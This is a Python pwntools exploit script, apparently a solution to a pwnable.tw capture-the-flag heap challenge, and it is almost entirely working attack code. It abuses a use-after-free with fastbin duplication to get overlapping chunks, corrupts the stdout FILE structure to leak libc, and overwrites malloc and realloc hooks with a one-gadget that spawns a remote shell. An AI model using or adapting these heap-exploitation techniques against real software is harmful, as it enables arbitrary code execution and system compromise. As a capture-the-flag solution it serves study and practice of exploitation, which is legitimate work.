from pwn import *

def alloc(size, data):
    r.sendafter(b'You Choice:',b'1')
    r.sendafter(b'Size :',str(size))
    r.sendafter(b'Data :',data)

def free(idx):
    r.sendafter(b'You Choice:',b'2')
    r.sendafter(b'Index :',str(idx))
while True :
    try :
        #r = process("./H", env={"LD_PRELOAD" : "./libc_64.so.6"})
        r = remote('chall.pwnable.tw',10308)
        ### vuln1 :  UAF in allocate chunks 

        alloc(0x68,p64(0x0)*5 + p64(0x71)) #0 0x010
        alloc(0x68,b'123') #1 0x080
        alloc(0x68,b'123') #2 0x0f0

        ### fast bin dup to get overlap chunks
        free(1)
        free(0)
        free(1)
        alloc(0x68,b'\x30') #3 0x080
        alloc(0x68,b'\x30') #4 0x010
        alloc(0x68,b'\x00' * 0x28 + p64(0x21) + p64(0)*3 + b'\x21') #5 0x080  fake chunk bottom to bypass check
        alloc(0x68,b'ccccc') #6 0x060  get overlap chunk 

        # ## set up fastbin dup layout for next exploit 
        free(6)  
        free(1)
        free(6)

        # ## get unsorted bin by create 0x90 size fake chunks
        free(0)
        alloc(0x68,p64(0)*5 + b'\x91') #7 ### overwrite fake chunk size that bigger than fastbin
        free(6)  # get unsorted bin 

        free(0)
        alloc(0x68,p64(0)*5  + p64(0x71) + b'\xdd\xf5') # 8

        # ### trigger fastbin dup and overwrite _IO_2_1_stdout_ FILE structure to leak libc address
        alloc(0x68,b'\xdd\xf5')  # 9
        alloc(0x68,b'\x00'*3 + p64(0)*6 + p64(0xfbad1887) + p64(0)*3 + b'\x40')  # 10
        leak = r.recv(6) 
        if b'\x7f' not in leak :
            raise
        break

    except:
        print(f'MISS !!!')
        r.close()
        pass

libc_base = u64(leak + b'\x00\x00') - 0x3c4640
success(f'LIBC : {hex(libc_base)}')

'''

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

'''
### fastbin dup to overwrite malloc_hook and realloc_hook
free(0)
free(1)
free(0)
addr = libc_base + 0x3c3afd - 0x10
alloc(0x68,p64(addr))
alloc(0x68,p64(addr))
alloc(0x68,p64(addr))
alloc(0x68,b'\x00'*3 + p64(0) + p64(libc_base+0x4526a) + p64(libc_base + 0x83b1c))
r.sendafter(b'You Choice:',b'1')
r.sendafter(b'Size :',b'\x20')

r.interactive()